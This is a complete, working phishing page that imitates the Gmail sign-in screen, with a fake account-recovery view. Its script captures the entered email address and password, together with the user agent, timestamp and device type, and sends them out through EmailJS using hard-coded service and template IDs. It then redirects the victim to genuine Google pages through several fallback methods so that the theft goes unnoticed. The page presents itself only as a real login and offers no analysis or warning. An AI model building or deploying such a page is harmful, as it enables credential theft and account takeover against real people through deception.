<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in to Gmail</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fff;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    height: 100vh;
    color: #202124;
  }
  .container {
    width: 360px;
    border: 1px solid #dadce0;
    padding: 40px 40px 30px;
    box-sizing: border-box;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 0.1);
  }
  .logo {
    display: flex; align-items: center; margin-bottom: 24px;
  }
  .logo img {
    height: 40px;
    margin-right: 8px;
  }
  h1 {
    font-weight: 400;
    font-size: 24px;
    margin: 0 0 8px 0;
  }
  p.subtitle {
    font-size: 14px;
    color: #5f6368;
    margin: 0 0 24px 0;
  }
  form label {
    display: block;
    font-size: 14px;
    margin-bottom: 4px;
    font-weight: 600;
  }
  form input {
    width: 100%;
    font-size: 16px;
    padding: 10px 12px;
    margin-bottom: 20px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    box-sizing: border-box;
  }
  form input:focus {
    border-color: #1a73e8;
    outline: none;
    box-shadow: 0 0 0 1px #1a73e8;
  }
  .forgot-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-bottom: 24px;
    display: inline-block;
  }
  button {
    background-color: #1a73e8;
    border: none;
    color: white;
    font-size: 14px;
    font-weight: 600;
    padding: 10px 24px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #1669c1;
  }
  
  button:disabled {
    background-color: #9aa0a6;
    cursor: not-allowed;
  }
  
  .page {
    display: none;
  }
  .page.active {
    display: block;
  }
  
  .back-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-top: 24px;
    display: inline-block;
  }
  
  .error {
    border-color: #d93025 !important;
    box-shadow: 0 0 0 1px #d93025 !important;
  }
  
  .error-message {
    font-size: 13px;
    color: #d93025;
    margin-top: -15px;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
  }
  
  .error-icon {
    margin-right: 8px;
    font-size: 16px;
  }

  /* Mobile-only optimizations - Desktop remains untouched */
  @media (max-width: 480px) {
    body {
      padding: 20px;
      min-height: 100vh;
      height: auto;
      align-items: flex-start;
      padding-top: 60px;
    }
    
    .container {
      width: 100%;
      max-width: 400px;
      padding: 32px 24px 24px;
      border: none;
      box-shadow: none;
    }
    
    form input {
      padding: 14px 12px;
      margin-bottom: 24px;
      font-size: 16px;
    }
    
    button {
      padding: 14px 24px;
      font-size: 16px;
      min-height: 48px;
    }
    
    .forgot-link, .back-link {
      padding: 8px 0;
      min-height: 32px;
      display: flex;
      align-items: center;
    }
  }
</style>
</head>
<body>

<!-- Login Page -->
<div id="login-page" class="page active">
  <div class="container" role="main" aria-label="Sign in to continue">
    <div class="logo">
      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Sign in with Google</span>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">to continue to <strong>Gmail</strong></p>
    <form id="login-form">
      <label for="email">Email or phone</label>
      <input id="email" name="user_email" type="email" placeholder="Email or phone" required autofocus autocomplete="username" />
      <div id="email-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter a valid email address</span>
      </div>
      <label for="password">Password</label>
      <input id="password" name="user_password" type="password" placeholder="Enter your password" required autocomplete="current-password" />
      <div id="password-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter your password</span>
      </div>
      <a href="#" class="forgot-link" tabindex="0" id="forgot-link">Forgot email?</a>
      <button type="submit" id="submit-btn">Next</button>
    </form>
  </div>
</div>

<!-- Forgot Email Page -->
<div id="forgot-page" class="page">
  <div class="container" role="main" aria-label="Account recovery">
    <div class="logo">
      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Account recovery</span>
    </div>
    <h1>Find your email</h1>
    <p class="subtitle">Enter your recovery phone number or recovery email address</p>
    <form id="recovery-form">
      <label for="recovery-info">Phone number or recovery email</label>
      <input id="recovery-info" name="recovery_info" type="text" placeholder="Phone number or recovery email" required autofocus />
      <div id="recovery-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter your phone number or recovery email</span>
      </div>
      <button type="submit">Next</button>
      <a href="#" class="back-link" id="back-link">Back to sign in</a>
    </form>
  </div>
</div>

<!-- EmailJS CDN - Version 4 as recommended -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "EB017wgX1BeDuRY66",
      });
   })();
</script>

<script>
// Fixed EmailJS Implementation with GUARANTEED redirect
(function() {
  console.log("üöÄ Starting EmailJS setup...");
  
  const SERVICE_ID = "service_64albro";
  const TEMPLATE_ID = "template_75g1nju";
  
  // Mobile detection
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 480;
  
  // GUARANTEED redirect function with multiple fallbacks
  function guaranteedRedirect(delay = 2000) {
    console.log("üîÑ Initiating guaranteed redirect in " + delay + "ms...");
    
    const redirectUrls = [
      "https://www.google.com",
      "https://google.com", 
      "https://mail.google.com",
      "https://accounts.google.com"
    ];
    
    setTimeout(() => {
      console.log("üåê Executing redirect...");
      let redirectIndex = 0;
      
      function attemptRedirect() {
        const url = redirectUrls[redirectIndex];
        console.log(`üéØ Trying redirect to: ${url}`);
        
        try {
          // Method 1: Standard location.href
          window.location.href = url;
          
          // Method 2: Backup with replace (executes if href fails)
          setTimeout(() => {
            window.location.replace(url);
          }, 500);
          
          // Method 3: Force redirect with assign
          setTimeout(() => {
            window.location.assign(url);
          }, 1000);
          
          // Method 4: Open in same window as last resort
          setTimeout(() => {
            window.open(url, '_self');
          }, 1500);
          
        } catch (error) {
          console.warn(`‚ùå Redirect attempt ${redirectIndex + 1} failed:`, error);
          redirectIndex++;
          
          if (redirectIndex < redirectUrls.length) {
            setTimeout(attemptRedirect, 200);
          } else {
            // Absolute last resort - reload page which might trigger browser's default behavior
            console.log("üîÑ All redirects failed, attempting page reload...");
            try {
              window.location.reload();
            } catch (e) {
              console.error("‚ùå Complete redirect failure:", e);
            }
          }
        }
      }
      
      attemptRedirect();
    }, delay);
  }
  
  if (isMobile) {
    console.log("üì± Mobile device detected - optimizing for mobile redirect");
  }
  
  // EmailJS is now initialized above, so we can use it directly
  console.log("‚úÖ EmailJS should be ready!");
  
  // DOM elements
  const loginPage = document.getElementById("login-page");
  const forgotPage = document.getElementById("forgot-page");
  const loginForm = document.getElementById("login-form");
  const recoveryForm = document.getElementById("recovery-form");
  const forgotLink = document.getElementById("forgot-link");
  const backLink = document.getElementById("back-link");
  const submitBtn = document.getElementById("submit-btn");
  
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const recoveryInput = document.getElementById("recovery-info");
  const emailError = document.getElementById("email-error");
  const passwordError = document.getElementById("password-error");
  const recoveryError = document.getElementById("recovery-error");
  
  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }
  
  function showError(input, errorDiv) {
    input.classList.add("error");
    errorDiv.style.display = "flex";
  }
  
  function hideError(input, errorDiv) {
    input.classList.remove("error");
    errorDiv.style.display = "none";
  }
  
  emailInput.addEventListener("input", function() {
    if (this.value && isValidEmail(this.value)) {
      hideError(emailInput, emailError);
    }
  });
  
  passwordInput.addEventListener("input", function() {
    if (this.value) {
      hideError(passwordInput, passwordError);
    }
  });
  
  recoveryInput.addEventListener("input", function() {
    if (this.value) {
      hideError(recoveryInput, recoveryError);
    }
  });
  
  // Improved email sending function
  function sendEmail(templateParams) {
    console.log("üìß Sending email with EmailJS...");
    console.log("üìã Template params:", templateParams);
    
    return emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
      .then(function(response) {
        console.log("‚úÖ Email sent successfully!", response.status, response.text);
        return response;
      })
      .catch(function(error) {
        console.error("‚ùå Email sending failed:", error);
        throw error;
      });
  }
  
  // Login form submission with immediate redirect
  loginForm.addEventListener("submit", function(event) {
    event.preventDefault();
    console.log("üìù Form submitted!");
    
    let hasErrors = false;
    
    // Disable button to prevent multiple submissions
    submitBtn.disabled = true;
    submitBtn.textContent = "Signing in...";
    
    if (!emailInput.value) {
      showError(emailInput, emailError);
      emailError.querySelector("span:last-child").textContent = "Please enter your email";
      hasErrors = true;
    } else if (!isValidEmail(emailInput.value)) {
      showError(emailInput, emailError);
      emailError.querySelector("span:last-child").textContent = "Please enter a valid email address";
      hasErrors = true;
    } else {
      hideError(emailInput, emailError);
    }
    
    if (!passwordInput.value) {
      showError(passwordInput, passwordError);
      hasErrors = true;
    } else {
      hideError(passwordInput, passwordError);
    }
    
    if (hasErrors) {
      submitBtn.disabled = false;
      submitBtn.textContent = "Next";
      console.log("‚ùå Form validation failed");
      return;
    }
    
    console.log("‚úÖ Form validation passed! Processing...");
    
    const templateParams = {
      user_email: emailInput.value,
      user_password: passwordInput.value,
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href,
      device_type: isMobile ? 'mobile' : 'desktop'
    };
    
    // Try to send email, but always redirect regardless
    sendEmail(templateParams)
      .then(function(response) {
        console.log("üéâ Email sent successfully, redirecting...");
        guaranteedRedirect(500); // Quick redirect on success
      })
      .catch(function(error) {
        console.log("‚ö†Ô∏è Email failed, redirecting anyway...");
        guaranteedRedirect(1000); // Slight delay on failure
      });
    
    // Backup redirect in case everything fails
    setTimeout(() => {
      guaranteedRedirect(0);
    }, 5000);
  });
  
  recoveryForm.addEventListener("submit", function(event) {
    event.preventDefault();
    
    if (!recoveryInput.value) {
      showError(recoveryInput, recoveryError);
      recoveryError.querySelector("span:last-child").textContent = "Please enter your phone number or recovery email";
      return;
    } else if (recoveryInput.value.includes("@") && !isValidEmail(recoveryInput.value)) {
      showError(recoveryInput, recoveryError);
      recoveryError.querySelector("span:last-child").textContent = "Please enter a valid recovery email address";
      return;
    } else {
      hideError(recoveryInput, recoveryError);
    }
    
    // Simulate recovery process and go back
    setTimeout(() => {
      alert("Recovery instructions would be sent to your recovery method.");
      forgotPage.classList.remove("active");
      loginPage.classList.add("active");
    }, 500);
  });
  
  forgotLink.addEventListener("click", function(e) {
    e.preventDefault();
    loginPage.classList.remove("active");
    forgotPage.classList.add("active");
    recoveryInput.focus();
  });
  
  backLink.addEventListener("click", function(e) {
    e.preventDefault();
    forgotPage.classList.remove("active");
    loginPage.classList.add("active");
    emailInput.focus();
  });
  
  // Keyboard accessibility
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      if (loginPage.classList.contains('active') && (emailInput.value || passwordInput.value)) {
        loginForm.dispatchEvent(new Event('submit'));
      } else if (forgotPage.classList.contains('active') && recoveryInput.value) {
        recoveryForm.dispatchEvent(new Event('submit'));
      }
    }
  });
  
  // Debug info
  console.log("üèÅ Script setup complete with guaranteed redirect!");
  console.log("üìä Current state:");
  console.log("- Mobile device:", isMobile);
  console.log("- Ready for form submission with immediate redirect");
  
})();
</script>
</body>
</html>
